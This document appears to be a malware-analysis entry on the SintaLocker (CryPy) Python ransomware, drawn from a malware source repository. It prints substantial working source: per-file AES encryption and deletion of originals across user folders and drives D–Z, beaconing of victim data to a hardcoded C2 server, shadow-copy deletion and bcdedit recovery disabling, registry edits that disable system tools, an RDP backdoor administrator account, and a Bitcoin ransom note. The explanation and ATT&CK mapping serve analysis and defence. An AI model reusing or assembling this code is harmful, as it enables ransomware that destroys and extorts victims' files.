# SintaLocker (CryPy) Python Ransomware - AES-256-CBC File Encryption with C2 Integration

## Repository
**MalwareSourceCode-main** → Python/Trojan-Ransom.Python.CryPy.a

## Source File Path
`/Python/Trojan-Ransom.Python.CryPy.a`

## Language
Python

## Code Snippet

### AES-256-CBC File Encryption (Lines 395-418)
```python
def encrypt_file(key, in_filename, newfilename, out_filename=None, chunksize=65536, Block=16):
    if not out_filename:
        out_filename = newfilename
    
    # Generate random 16-byte IV
    iv = ''.join((chr(random.randint(0, 255)) for i in range(16)))
    
    # Initialize AES-256-CBC cipher
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)
    
    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            # Write file header: [8-byte filesize][16-byte IV][encrypted data]
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)
            
            # Encrypt file in 64KB chunks
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                # PKCS7-style padding (space characters)
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - len(chunk) % 16)
                outfile.write(encryptor.encrypt(chunk))
```

### Random Key Generation and File Obfuscation (Lines 383-393)
```python
def generate_file(file_path, filename):
    make_directory(file_path)  # Create __SINTA I LOVE YOU__ directory
    
    # Generate random 32-character AES key per file
    key = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(32)])
    
    # Generate random 36-character filename with .sinta extension
    newfilename = file_path + '\\' + encfolder + '\\' + text_generator(36, '1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm')
    
    try:
        encrypt_file(key, filename, newfilename)
    except:
        pass

def text_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join((random.choice(chars) for _ in range(size))) + '.' + newextns
```

### C2 Server Integration with Victim Profiling (Lines 13-26)
```python
userhome = os.path.expanduser('~')
my_server = 'http://www.dobrebaseny.pl/js/lib/srv/'
wallpaper_link = 'http://wallpaperrs.com/uploads/girls/thumbs/mood-ravishing-hd-wallpaper-142943312215.jpg'

# Beacon victim information to C2 server
victim_info = base64.b64encode(str(platform.uname()))
configurl = my_server + 'api.php?info=' + victim_info + '&ip=' + base64.b64encode(socket.gethostbyname(socket.gethostname()))

glob_config = None
try:
    # Retrieve victim-specific configuration from C2
    glob_config = json.loads(urllib.urlopen(configurl).read())
    if set(glob_config.keys()) != set(['MRU_ID', 'MRU_UDP', 'MRU_PDP']):
        raise Exception('0x00001')
except IOError:
    time.sleep(1)

# Parse C2 response: victim ID, remote desktop username/password
victim_id = glob_config[u'MRU_ID']
victim_r = glob_config[u'MRU_UDP']  # RDP username
victim_s = glob_config[u'MRU_PDP']  # RDP password
```

### System Sabotage and Anti-Recovery (Lines 27-56)
```python
try:
    # Disable Windows Recovery Environment
    os.system('bcdedit /set {default} recoveryenabled No')
    os.system('bcdedit /set {default} bootstatuspolicy ignoreallfailures')
    
    # Disable Registry Editor, Task Manager, CMD
    os.system('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableRegistryTools /d 1 /f')
    os.system('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableTaskMgr /d 1 /f')
    os.system('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableCMD /d 1 /f')
    os.system('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoRun /d 1 /f')
except WindowsError:
    pass

def destroy_shadow_copy():
    try:
        # Delete all Volume Shadow Copies
        os.system('vssadmin Delete Shadows /All /Quiet')
    except:
        pass

def create_remote_desktop():
    try:
        # Enable RDP and create admin backdoor account
        os.system('REG ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f')
        os.system('net user ' + victim_r + ' ' + victim_s + ' /add')
        os.system('net localgroup administrators ' + victim_r + ' /add')
    except:
        pass
```

### Extensive File Type Targeting (Lines 93-349)
```python
def find_files(root_dir):
    write_instruction(root_dir, 'md')
    extentions = [
        '*.txt', '*.exe', '*.php', '*.pl', '*.7z', '*.rar', '*.m4a',
        '*.wma', '*.avi', '*.wmv', '*.csv', '*.d3dbsp', '*.sc2save',
        # ... 200+ file extensions ...
        '*.doc', '*.docx', '*.docm', '*.xls', '*.xlsx', '*.ppt', '*.pptx',
        '*.pdf', '*.psd', '*.ai', '*.dwg', '*.sql', '*.mdb', '*.accdb',
        '*.vmdk', '*.vdi', '*.qcow2',  # VM disk images
        '*.key', '*.csr', '*.pem', '*.pfx',  # Certificates
        'wallet.dat'  # Bitcoin wallet
    ]
    
    # Recursively walk directory tree
    for dirpath, dirs, files in os.walk(root_dir):
        if 'Windows' not in dirpath:  # Exclude C:\Windows
            for basename in files:
                for ext in extentions:
                    if fnmatch.fnmatch(basename, ext):
                        filename = os.path.join(dirpath, basename)
                        yield filename
```

### Multi-Drive Encryption (Lines 420-464)
```python
listdir = (
    userhome + '\\Contacts\\',
    userhome + '\\Documents\\',
    userhome + '\\Downloads\\',
    userhome + '\\Favorites\\',
    userhome + '\\Links\\',
    userhome + '\\My Documents\\',
    userhome + '\\My Music\\',
    userhome + '\\My Pictures\\',
    userhome + '\\My Videos\\',
    'D:\\', 'E:\\', 'F:\\', 'G:\\', 'I:\\', 'J:\\', 'K:\\', 'L:\\',
    'M:\\', 'N:\\', 'O:\\', 'P:\\', 'Q:\\', 'R:\\', 'S:\\', 'T:\\',
    'U:\\', 'V:\\', 'W:\\', 'X:\\', 'Y:\\', 'Z:\\'
)

# Encrypt all files across multiple drives
for dir_ in listdir:
    for filename in find_files(dir_):
        generate_file(dir_, filename)
        delete_file(filename)  # Delete original file

# Execute post-encryption tasks
persistance()               # Add to autostart registry
destroy_shadow_copy()       # Delete shadow copies
create_remote_desktop()     # Create RDP backdoor
write_instruction(userhome + '\\Desktop\\', 'txt')  # Drop ransom note
os.startfile(userhome + '\\Desktop\\README_FOR_DECRYPT.txt')  # Open ransom note
setWallpaper(wallpaper_link)  # Change desktop wallpaper to ransom image
```

### Ransom Note Template (Lines 70-78)
```python
def write_instruction(dir, ext):
    try:
        files = open(dir + '\\README_FOR_DECRYPT.' + ext, 'w')
        files.write('! ! ! OWNED BY ' + rmsbrand + ' ! ! !\r\n\r\n'
                    'All your files are encrypted by ' + rmsbrand + ' with strong chiphers.\r\n'
                    'Decrypting of your files is only possible with the decryption program, which is on our secret server.\r\n'
                    'All encrypted files are moved to ' + encfolder + ' directory and renamed to unique random name.\r\n'
                    'To receive your decryption program send $100 USD Bitcoin to address: ' + btc_address + '\r\n'
                    'Contact us after you send the money: ' + email_con + '\r\n\r\n'
                    'Just inform your identification ID and we will give you next instruction.\r\n'
                    'Your personal identification ID: ' + victim_id + '\r\n\r\n'
                    'As your partner,\r\n\r\n' + rmsbrand + '')
    except:
        pass

# Ransom contact information
rmsbrand = 'SintaLocker'
email_con = 'sinpayy@yandex.com'
btc_address = '1NEdFjQN74ZKszVebFum8KFJNd9oayHFT1'
```

## Explanation

**SintaLocker (CryPy)** is a Python-based ransomware demonstrating how scripting languages enable rapid malware development with sophisticated encryption and C2 integration. Despite being implemented in Python, it achieves full-featured ransomware capabilities comparable to compiled malware.

**Encryption Architecture:**
- **AES-256-CBC**: Uses PyCrypto library for AES encryption in CBC mode. Each file receives a unique random 32-character alphanumeric key (256 bits). The file header structure is `[8-byte little-endian filesize][16-byte IV][AES-encrypted data]` to enable decryption.
- **Key Management Issue**: Generated AES keys are **not stored or transmitted anywhere** - this is a critical flaw making files permanently unrecoverable even if ransom is paid, as the attacker has no way to retrieve per-file keys. This suggests amateur malware development or intentionally destructive design.
- **File Obfuscation**: Moves encrypted files to `__SINTA I LOVE YOU__` subdirectory and renames them to random 36-character alphanumeric names with `.sinta` extension (e.g., `A7K3M9P2W...XYZ.sinta`), making it difficult for victims to identify original files.
- **Original File Destruction**: Deletes plaintext originals after encryption via `delete_file()` function.

**Command & Control Integration:**
- **C2 Beaconing**: Contacts hardcoded C2 server (`http://www.dobrebaseny.pl/js/lib/srv/api.php`) with Base64-encoded victim fingerprint: system info (`platform.uname()`) and local IP address.
- **Dynamic Configuration**: Retrieves JSON payload containing: `MRU_ID` (victim identifier for ransom note), `MRU_UDP`/`MRU_PDP` (RDP backdoor credentials), enabling per-victim tracking and remote access.
- **Wallpaper Replacement**: Downloads and sets malicious wallpaper image as visual ransom notification.

**Anti-Recovery and Persistence:**
- **Shadow Copy Deletion**: Executes `vssadmin Delete Shadows /All /Quiet` to remove all Volume Shadow Copies, blocking Windows System Restore recovery.
- **Boot Configuration Tampering**: Disables Windows Recovery Environment (`bcdedit /set {default} recoveryenabled No`) and sets boot to ignore all failures, preventing safe mode boot recovery.
- **System Tool Disabling**: Registry modifications disable Task Manager, Registry Editor, Command Prompt, and Run dialog, hindering victim response and malware removal.
- **RDP Backdoor**: Enables Remote Desktop Protocol, creates new admin user with C2-provided credentials, and adds to Administrators group - allowing persistent remote access even after ransom payment.
- **Startup Persistence**: Adds itself to registry autorun keys via `SintaRegistery.addRegistery()` for execution on every boot.

**File Targeting:**
- **Extensive Extension Whitelist**: Targets 200+ file extensions including documents (.doc, .pdf), databases (.sql, .mdb), media files, source code, CAD files (.dwg), VM disk images (.vmdk, .vdi, .qcow2), SSL certificates (.key, .pem, .pfx), and cryptocurrency wallets (`wallet.dat`).
- **Multi-Drive Coverage**: Encrypts user profile directories (Documents, Downloads, Pictures, etc.) and systematically attempts encryption on drives D: through Z: to catch external drives, network shares, and additional partitions.
- **System Directory Exclusion**: Skips `C:\Windows` to maintain OS functionality and avoid system crashes that would prevent ransom payment.

**Operational Flow:**
1. Contact C2 server to retrieve victim ID and RDP credentials
2. Disable system recovery tools and system administration utilities
3. Recursively discover files across all drives (user folders + D-Z)
4. Generate unique 32-char AES key per file
5. Encrypt file to `__SINTA I LOVE YOU__/<random-36-char>.sinta`
6. Delete original plaintext file
7. Delete shadow copies and create RDP backdoor
8. Drop ransom notes (README_FOR_DECRYPT.txt/.md)
9. Change desktop wallpaper and open ransom note
10. Add to startup registry for persistence

This directly implements **MITRE ATT&CK T1486 (Data Encrypted for Impact)** as the primary attack objective. Supporting techniques include **T1490 (Inhibit System Recovery)** via shadow copy deletion and boot config tampering, **T1543.003 (Create or Modify System Process: Windows Service)** via RDP enablement, **T1112 (Modify Registry)** for tool disabling and persistence, **T1071.001 (Application Layer Protocol: Web Protocols)** for C2 communication, and **T1136.001 (Create Account: Local Account)** for RDP backdoor creation.

The $100 USD Bitcoin ransom demand is unusually low compared to typical ransomware ($500-$10,000+), suggesting this may be amateur malware, a proof-of-concept, or targeted at individual users rather than enterprises. The fatal design flaw of not storing/transmitting AES keys renders this more akin to a wiper than recoverable ransomware.

